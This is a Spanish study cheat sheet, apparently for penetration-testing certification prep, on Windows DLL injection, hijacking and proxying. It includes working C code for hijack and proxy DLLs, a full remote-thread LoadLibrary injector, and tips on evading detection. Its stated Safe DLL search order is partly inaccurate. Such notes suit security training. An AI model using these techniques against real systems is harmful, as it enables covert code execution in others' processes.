---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)

- La inyección de DLL es la inserción de código malicioso como una biblioteca de enlace dinámico dentro de un proceso en ejecución, permitiendo ejecución en el contexto y con permisos del proceso objetivo.
- Existen múltiples vectores: LoadLibrary (detectado), Mapeo Manual (complejo, evasivo), Inyección Reflexiva (auto-contenida en memoria), y Secuestro de DLL (explotar búsqueda de DLLs no especificada).
- El secuestro de DLL aprovecha el orden de búsqueda de Windows (Safe DLL Search Mode) para colocar DLLs maliciosas en directorios accesibles que se cargan antes que las legítimas.
- Las técnicas de proxying y DLLs no válidas permiten interceptar y modificar el comportamiento sin acceso a código fuente.

---

## Herramientas Clave

| Herramienta | Propósito Específico |
|---|---|
| Visual Studio / MinGW | Compilación de código C/C++ para DLLs maliciosas |
| Process Monitor (Procmon) | Análisis de operaciones de carga de DLL y búsqueda de vector de explotación |
| Debugger (WinDbg / x64dbg) | Inspección de memory layout y validación de inyección exitosa |
| GetProcAddress | Resolución dinámica de direcciones de funciones importadas |
| CreateRemoteThread | Ejecución remota de código en proceso objetivo |
| VirtualAllocEx | Asignación de memoria en espacio del proceso objetivo |
| WriteProcessMemory | Escritura de datos en memoria remota |

---

## Metodología Paso a Paso

### Fase 1: Reconocimiento y Enumeración

**Objetivo:** Identificar el proceso objetivo y su comportamiento de carga de DLL.

1. Ejecutar Process Monitor (Procmon.exe) con privilegios administrativos
2. Aplicar filtros para aislar el proceso objetivo (ej. Operation is Load Image, Operation is CreateFile)
3. Ejecutar la aplicación objetivo y observar qué DLLs intenta cargar y dónde las busca
4. Documentar rutas de búsqueda, nombres de DLLs y puntos de NAME NOT FOUND
5. Identificar qué métodos de inyección son viables según el modelo de seguridad del proceso

**Lógica:** Procmon te muestra exactamente dónde Windows busca las DLLs y qué está fallando. Esto revela puntos débiles de explotación.

---

### Fase 2: Selección del Vector de Inyección

Basado en lo observado en Procmon, elegir la técnica:

**LoadLibrary (Básico, Detectado)**
- Requiere: Handle abierto al proceso, creación de thread remoto
- Usable cuando: Control bajo del objetivo, no hay EDR sofisticado
- Riesgo: APIs monitoreadas (OpenProcess, CreateRemoteThread)

**Mapeo Manual (Avanzado, Evasivo)**
- Requiere: Máxima complejidad, implementación de PE loader mínimo
- Usable cuando: Necesitas evadir detección de LoadLibrary
- Riesgo: Requiere resolver importaciones y reubicaciones manualmente

**Inyección Reflexiva (Auto-contenida)**
- Requiere: DLL con función ReflectiveLoader exportada
- Usable cuando: La DLL puede cargar sus propias dependencias desde memoria
- Riesgo: Menos compatible si la DLL original no soporta reflexión

**Secuestro de DLL (Pasivo, Efectivo)**
- Requiere: Acceso de escritura al directorio donde se buscan las DLLs
- Usable cuando: El objetivo busca DLLs sin especificar ruta completa
- Riesgo: Requiere acceso filesystem previo; puede ser detectado post-execution

---

### Fase 3: Creación del Payload

**Para Secuestro (Opción más directa para CPTS):**

1. Crear DLL maliciosa con DllMain que ejecute payload deseado
2. Colocar DLL en directorio que el proceso busca antes que System32
3. Ejecutar o esperar a que el proceso objetivo cargue la DLL

**Para Proxying (Interceptar funciones específicas):**

1. Identificar la función exportada que se debe interceptar (ej. Add())
2. Crear DLL proxy que cargue la DLL original desde ubicación alternativa
3. Ejecutar lógica personalizada antes/después de la función original
4. Devolver resultado manipulado al proceso llamador

**Lógica:** El proxying es transparente al objetivo; continúa funcionando normal pero con comportamiento alterado.

---

### Fase 4: Explotación y Validación

1. Compilar el payload (DLL)
2. Colocar DLL en ubicación apropiada (directorio aplicación, ruta búsqueda, etc.)
3. Ejecutar aplicación objetivo o esperar a que se cargue automáticamente
4. Validar ejecución mediante:
   - Observación de stdout/stderr
   - Moniteo con Procmon (verificar Load Image exitosa)
   - Análisis de comportamiento post-execution
   - Inspección de memoria si es necesario

---

## Cheat Sheet de Comandos

### Monitoreo con Process Monitor

```bash
# No hay CLI puro para Procmon; se abre con GUI
# Pero puedes capturar output via:

# Exportar sesión de Procmon a CSV para análisis posterior
# Desde PowerShell con Procmon abierto
# File > Save As > CSV

# Filtrar en GUI:
# Operation is Load Image
# Operation is CreateFile
# Result is NAME NOT FOUND (para encontrar DLLs no encontradas)
```

### Compilación de DLL Maliciosa (Secuestro Básico)

```c
// malicious.c - DLL para secuestro directo
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Código ejecutado cuando se carga la DLL
        printf("[+] DLL INYECTADA EXITOSAMENTE\n");
        
        // Aquí colocas tu payload: reverse shell, dumping credentials, etc.
        // system("cmd.exe /c <COMMAND>");
        
        // O ejecutar shellcode embebido aquí
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

```bash
# Compilar con MinGW desde línea de comandos
# -shared: Crear DLL (en lugar de ejecutable)
# -o: Nombre del output
gcc -shared -o malicious.dll malicious.c

# Compilar con Visual Studio (cl.exe)
cl.exe /LD malicious.c
```

### DLL Proxying (Interceptar y Manipular Funciones)

```c++
// proxy.c - DLL proxy para manipular función original
#include <stdio.h>
#include <Windows.h>

// Definir tipo de función que será proxy
typedef int (*OriginalFunc)(int, int);

// La función exportada que remplazará la original
__declspec(dllexport) int Add(int a, int b)
{
    // Cargar la DLL original (renombrada como .o)
    HMODULE originalLib = LoadLibraryA("library.o.dll");
    
    if (originalLib != NULL)
    {
        // Obtener dirección de la función original
        OriginalFunc originalFunc = (OriginalFunc)GetProcAddress(originalLib, "Add");
        
        if (originalFunc != NULL)
        {
            printf("[+] FUNCION INTERCEPTADA\n");
            
            // Ejecutar función original
            int result = originalFunc(a, b);
            
            // MANIPULAR RESULTADO
            printf("[+] Resultado original: %d\n", result);
            result += 1;  // Ejemplo: agregar 1 al resultado
            printf("[+] Resultado modificado: %d\n", result);
            
            // Devolver resultado manipulado
            return result;
        }
    }
    
    return -1;  // Error si no se puede cargar original
}
```

```bash
# Compilar DLL proxy
gcc -shared -o library.dll proxy.c -lkernel32

# Los pasos de explotación son:
# 1. Renombrar library.dll original a library.o.dll
# 2. Colocar library.dll (proxy) en directorio de aplicación
# 3. Ejecutar aplicación objetivo
# 4. La aplicación carga proxy en lugar de original
# 5. Proxy carga original y modifica comportamiento
```

### DLL No Válida (Secuestro de PATH)

```c
// hijack.c - DLL que remplaza DLL no encontrada
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Ejecutado cuando Windows carga esta DLL
        printf("[!] SECUESTRO EXITOSO - DLL CARGADA\n");
        printf("[!] PID del proceso: %lu\n", GetCurrentProcessId());
        
        // Payload aquí (reverse shell, etc.)
        // La mayoría del tiempo, simplemente ejecutar y salir es suficiente
    }
    break;
    }
    return TRUE;
}
```

```bash
# Compilar la DLL hijack
gcc -shared -o hijack.dll hijack.c

# Los pasos son:
# 1. Usar Procmon para identificar qué DLL busca el proceso pero NO ENCUENTRA
#    (Resultado = NAME NOT FOUND)
# 2. Ejemplo: main.exe busca x.dll en C:\Users\User\Desktop\app\x.dll
# 3. Renombrar hijack.dll a x.dll
# 4. Colocar x.dll en ese directorio
# 5. Cuando se ejecute main.exe, cargará hijack.dll como x.dll
# 6. DllMain se ejecutará automáticamente
```

### LoadLibrary (Inyección Remota - Método API)

```c
// injector.c - Inyector que usa LoadLibrary en proceso remoto
#include <windows.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
    if (argc != 3) {
        printf("Uso: %s <PID> <ruta_a_dll>\n", argv[0]);
        return -1;
    }

    DWORD targetPID = atoi(argv[1]);
    const char* dllPath = argv[2];

    // Paso 1: Obtener handle al proceso objetivo
    // PROCESS_ALL_ACCESS = acceso completo (requiere privilegios)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (hProcess == NULL) {
        printf("[-] ERROR: No se pudo abrir proceso (PID: %lu)\n", targetPID);
        return -1;
    }
    printf("[+] Proceso abierto exitosamente\n");

    // Paso 2: Asignar memoria en el proceso remoto para la ruta de la DLL
    // strlen(dllPath) + 1 para incluir el null terminator
    LPVOID remoteMemory = VirtualAllocEx(
        hProcess,               // Proceso objetivo
        NULL,                   // Dejar que Windows elija la dirección
        strlen(dllPath) + 1,    // Tamaño: longitud de ruta
        MEM_RESERVE | MEM_COMMIT,  // Reservar y comprometer memoria
        PAGE_READWRITE          // Permisos de lectura/escritura
    );
    
    if (remoteMemory == NULL) {
        printf("[-] ERROR: VirtualAllocEx falló\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Memoria asignada en proceso remoto: 0x%p\n", remoteMemory);

    // Paso 3: Escribir la ruta de la DLL en la memoria remota
    BOOL writeSuccess = WriteProcessMemory(
        hProcess,               // Proceso objetivo
        remoteMemory,           // Dirección donde escribir
        (LPVOID)dllPath,        // Buffer con la ruta
        strlen(dllPath) + 1,    // Número de bytes a escribir
        NULL                    // No nos importa cuántos bytes se escribieron
    );
    
    if (!writeSuccess) {
        printf("[-] ERROR: WriteProcessMemory falló\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Ruta de DLL escrita en memoria remota\n");

    // Paso 4: Obtener la dirección de LoadLibraryA en kernel32.dll
    // LoadLibraryA es la función que cargará nuestra DLL
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(
        GetModuleHandle("kernel32.dll"),
        "LoadLibraryA"
    );
    
    if (loadLibraryAddr == NULL) {
        printf("[-] ERROR: No se pudo obtener dirección de LoadLibraryA\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Dirección de LoadLibraryA: 0x%p\n", loadLibraryAddr);

    // Paso 5: Crear un thread remoto que ejecute LoadLibrary
    // El thread comenzará en loadLibraryAddr y recibirá remoteMemory (ruta) como parámetro
    HANDLE hThread = CreateRemoteThread(
        hProcess,                           // Proceso donde crear thread
        NULL,                               // Seguridad default
        0,                                  // Tamaño stack default
        (LPTHREAD_START_ROUTINE)loadLibraryAddr,  // Dirección inicio (LoadLibraryA)
        remoteMemory,                       // Parámetro (puntero a ruta de DLL)
        0,                                  // Flags (0 = start inmediatamente)
        NULL                                // No necesitamos thread ID
    );
    
    if (hThread == NULL) {
        printf("[-] ERROR: CreateRemoteThread falló\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("[+] Remote thread creado exitosamente\n");

    // Paso 6: Esperar a que el thread termine
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] INYECCION COMPLETADA - DLL cargada en proceso remoto\n");

    // Limpieza
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

```bash
# Compilar el inyector
gcc -o injector.exe injector.c

# Usar el inyector:
# injector.exe <PID> <ruta_completa_a_dll>

# Ejemplo:
# injector.exe 1234 C:\malicious.dll

# REQUIERE: Ejecución como ADMINISTRADOR
```

### PowerShell para Obtener PID de Proceso Objetivo

```powershell
# Obtener PID de un proceso específico
Get-Process -Name <PROCESS_NAME> | Select-Object ProcessName, Id

# Ejemplo:
Get-Process -Name notepad | Select-Object ProcessName, Id

# Salida típica:
# ProcessName Id
# ----------- --
# notepad     5432
```

```bash
# Desde cmd.exe obtener PID
tasklist /FI "IMAGENAME eq <PROCESS_NAME>"

# Ejemplo:
tasklist /FI "IMAGENAME eq notepad.exe"
```

---

## Gotchas y Troubleshooting

### Privilegios

- **Requerimiento:** Crear threads remotos y escribir en memoria de procesos ajenos requiere **privilegios administrativos**
- **Síntoma:** OpenProcess falla o retorna NULL
- **Solución:** Ejecutar el inyector como Administrator. En PowerShell: `Start-Process -FilePath "cmd.exe" -Verb RunAs`

### Safe DLL Search Mode

- **Concepto:** Por defecto habilitado en Windows moderno. Cambia el orden de búsqueda de DLLs
- **Impacto:** El directorio actual ya no es el primer lugar donde se buscan DLLs (protección anti-hijacking)
- **Comprobar estado en registro:**
```
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
  SafeDllSearchMode (1 = habilitado, 0 = deshabilitado)
```
- **Orden de búsqueda con SafeDllSearchMode=1:**
  1. Directorio de la aplicación
  2. C:\Windows\System32
  3. C:\Windows\System16 (legacy)
  4. C:\Windows
  5. Directorios en PATH
  6. Directorio actual del usuario (último)

### DLL Dependencies

- **Problema:** Tu DLL maliciosa puede tener dependencias externas que no están disponibles en el proceso objetivo
- **Síntoma:** DLL se carga pero DllMain nunca se ejecuta, o crash del proceso
- **Solución:** Usar compilación estática (`-static` flag) o minimizar dependencias externas

### Procmon Filters

- **Para encontrar qué busca cargar:**
```
  Operation is Load Image
  + Process Name is <TARGET.exe>
```
- **Para encontrar DLLs no encontradas:**
```
  Operation is CreateFile
  Path ends with .dll
  Result is NAME NOT FOUND
  Process Name is <TARGET.exe>
```
- **Para ver intentos de acceso:**
```
  Result is NAME NOT FOUND
  Process Name is <TARGET.exe>
  Operation is CreateFile
```

### Detectabilidad

- **LoadLibrary Injection:** Altamente detectable por:
  - Monitoreo de APIs (OpenProcess, CreateRemoteThread, WriteProcessMemory)
  - Análisis de comportamiento anómalo (crear threads remotos)
  - EDR/Antivirus que hookean kernel32 APIs
  
- **DLL Hijacking:** Menos detectable pero:
  - Requiere acceso write previo al filesystem
  - Comportamiento observable post-execution si la DLL ejecuta payloads visibles
  - Solución: Cargar DLL genuina + patching en memoria, o ejecutar payload de forma silenciosa

- **Reflective DLL Injection:** Más evasivo pero:
  - Más complejo de implementar
  - Compatible solo si DLL soporta ReflectiveLoader
  - Evita cargar desde disco (menos rastros en filesystem)

### Validar Inyección Exitosa

- **Síntoma esperado:** DllMain de la DLL inyectada se ejecuta
- **Verificar en Procmon:**
  - Buscar "Load Image" + nombre de tu DLL
  - Debe mostrar "SUCCESS" y una dirección base de imagen
- **Con debugger:**
  - Adjuntar debugger al proceso objetivo
  - Buscar módulos cargados en lista de módulos
  - Verificar dirección base coincida con Procmon

### Casos Especiales

- **Acceso denegado al abrir proceso:** El proceso objetivo puede tener mayor integridad (System > Administrator > User). Inyectar desde proceso de igual o mayor privilegio.
- **DLL "virtualization":** Windows 10+ puede virtualizar escrituras a directorios protegidos. Si colocas DLL en System32, puede ser redirigida a VirtualStore. Usa directorios en AppData en su lugar.
- **ASLR activo:** Dirección base de módulos puede ser aleatoria. LoadLibraryA internamente maneja esto, pero en mapeo manual debes recalcular direcciones dinámicamente.

---

## Referencias Rápidas

**Flags clave de VirtualAllocEx:**
- `MEM_RESERVE`: Reservar rango de dirección (sin asignar físicamente)
- `MEM_COMMIT`: Asignar memoria física
- `PAGE_READWRITE`: Acceso lectura/escritura
- Usar ambas: `MEM_RESERVE | MEM_COMMIT`

**Flags clave de CreateRemoteThread:**
- `0` como flags = thread inicia inmediatamente
- `CREATE_SUSPENDED` = thread creado pero pausado (luego usar ResumeThread)

**Safe DLL Search Mode Registry Path:**
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager
Nombre: SafeDllSearchMode
Tipo: DWORD
Valor: 1 (habilitado) o 0 (deshabilitado)
```